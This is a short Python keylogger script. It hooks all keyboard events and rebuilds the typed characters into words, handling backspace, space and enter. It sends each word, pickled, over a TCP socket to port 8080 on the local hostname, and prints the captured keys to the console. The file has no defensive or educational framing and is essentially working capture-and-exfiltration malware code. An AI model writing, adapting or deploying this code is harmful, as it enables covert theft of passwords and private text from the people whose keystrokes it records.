import os
import socket
import pickle
import keyboard


class Dispatch:
    def __init__(self):
        self.sentence_buffer = []
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = socket.gethostname()
        self.port = 8080
        self.s.connect((self.host, self.port))

    def send_packets(self, packet):
        self.s.send(pickle.dumps(str(packet) + '\r\n'))


class Keys:
    def __init__(self):
        self.char_buffer = []
        self.sentence_buffer = []

    def create_word(self, client):
        word = ""
        for i in self.char_buffer:
            word += i
        self.sentence_buffer.append(word.strip())
        self.char_buffer = []

        print(self.sentence_buffer)

        client.send_packets(word)

    def delete_char(self):
        if self.char_buffer:
            self.char_buffer.pop()
        else:
            print("buffer is empty")

    def append_char(self, ch):
        self.char_buffer.append(ch)


def log_keys(e, obj, client):

    if e.event_type == "up":
        return
    key_press = e.name

    if key_press == "backspace":
        print(key_press)
        print(obj.char_buffer)
        return obj.delete_char()
    elif key_press == 'space' or key_press == "enter":
        print(key_press)
        print(obj.char_buffer)
        obj.create_word(client)
        return obj.append_char(' ')

    # this has to be at the very end
    # just to make sure we're catching symbols
    elif len(key_press) > 1:
        return

    obj.append_char(key_press)
    print(key_press)
    print(obj.char_buffer)


if __name__ == "__main__":
    key = Keys()
    dsp = Dispatch()

    while True:

        # space will create words
        # enter will create sentences
        # backspace will pop

        keyboard.hook(lambda x: log_keys(x, key, dsp))
        keyboard.wait()
